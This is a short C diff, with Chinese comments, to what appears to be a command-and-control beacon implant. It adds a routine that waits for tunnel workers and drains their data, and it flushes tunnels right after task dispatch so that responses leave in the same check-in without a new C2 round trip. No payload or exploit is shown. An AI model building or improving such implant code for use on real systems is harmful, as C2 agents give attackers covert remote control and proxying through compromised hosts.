@@ -138,6 +138,13 @@ VOID AgentFlushTunnels(BeaconContext* ctx)
     PlistFree(&out);
 }
 
+/* 同 tick 收割：短暂等待 worker 入队后再排空，避免响应落到下一轮 sleep */
+VOID AgentHarvestTunnels(BeaconContext* ctx)
+{
+    TunnelHarvestWait(&ctx->tunnels);
+    AgentFlushTunnels(ctx);
+}
+
 /* 轮询级联子链路数据 */
 VOID AgentFlushCascade(BeaconContext* ctx)
 {
@@ -239,8 +246,9 @@ INT AgentFlushOutbox(BeaconContext* ctx, OutboxSendFn send, VOID* ctx_sender)
         cur = next;
     }
 
-    /* 5. dispatch 响应里的任务（一次） */
+    /* 5. dispatch 响应里的任务（一次），再排空隧道（不等待，不新开 C2 往返） */
     AgentDispatchTasks(ctx, &response);
+    AgentFlushTunnels(ctx);
     BbFree(&response);
     return 1;
 }
